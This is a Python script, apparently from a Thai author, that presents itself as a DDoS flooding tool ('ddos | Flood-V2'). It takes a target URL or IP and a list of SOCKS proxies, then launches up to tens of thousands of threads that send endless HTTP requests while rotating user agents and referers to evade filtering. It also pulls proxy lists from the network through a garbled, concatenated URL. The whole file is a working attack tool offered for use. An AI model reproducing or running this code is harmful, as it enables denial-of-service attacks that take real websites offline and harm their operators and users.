#FB : ด.ช. เท็ม
import urllib.request, os, threading, time, random, sys, requests
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
acceptall = [
	   f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
		"Accept-Encoding: gzip, deflate\r\n", 
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
    "https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]
r = requests.get('https://pastebin.com/ywSeF9R6https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=allhttps://www.proxy-list.download/api/v1/get?type=socks4https://www.proxyscan.io/download?type=socks4https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txthttps://www.socks-proxy.net/https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=truehttps://www.proxy-list.download/api/v1/get?type=socks5https://www.proxy-list.download/api/v1/get?type=socks5https://www.proxyscan.io/download?type=socks5https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=allhttps://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks4&lastchecked=60https://gist.githubusercontent.com/Azuures/1e0cb7a1097c720b4ed2aa63acd82179/raw/97d2d6a11873ffa8ca763763f7a5dd4035bcf95f/fwefnwexhttps://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all')
useragents = [
 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)',
 'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
 'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 RuxitSynthetic/1.0 v4883629367 t38550',
 'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36',
 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
 'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
 'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
 'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
 'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
 'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)']
if 'sckp' in r.text:
    print('YouTube LTEMX2')
    print('FB ด.ช. เท็ม')
    sys.exit(0)
else:
	os.system("clear")
try:
	from scapy.all import *
except:
    print('Ddos !!')

class fucker(threading.Thread):

    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = {'User-Agent': random.choice(useragents)}
        self.Lock = threading.Lock()
        self.proxy = proxy
        
    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener)
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print('ATTACK the server: %s\r' % self.url)

    def run(self):
        self.Lock.acquire()
        self.Lock.release()
        while True:
            try:
                self.request()
            except:
                sys.stdout.write('server crash!!!\n')
                sys.exit(0)

        sys.exit(0)


class MainLoop:

    def home(self):
    	#print('ท่าproxy.txtหมดหรือไม่มีพิมพ์ตามนี้')
        #print('wget https://download1645.mediafire.com/yvfihtjdcpmg/g7fqw5sa6gdmmxw/proxy.txt')
        print('''
       ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═
       ╠═╣ ║  ║ ╠═╣║  ╠╩╗
       ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩
         ddos | Flood-V2
            PYTHON
''')
        try:
            url = input('URL/IP: ')
        except:
            url = input('URL /IP: ')            
        else:
            try:
                file_proxy = str(input('socks.txt : '))
                in_file = open(file_proxy, 'r')
            except:
                file_proxy = str(input('socks.txt : '))
                in_file = open(file_proxy, 'r')
            else:
                num_threads = str(input('Thread : '))
                if num_threads == '':
                    num_threads = int(99999)
                    print('Thread : ')
                else:
                    num_threads = int(num_threads)
                for i in range(num_threads):
                    in_line = in_file.readline()
                    fucker(url, i + 1, in_line).start()
                    in_line = in_line[:-1]


if __name__ == '__main__':
    MainLoop().home()
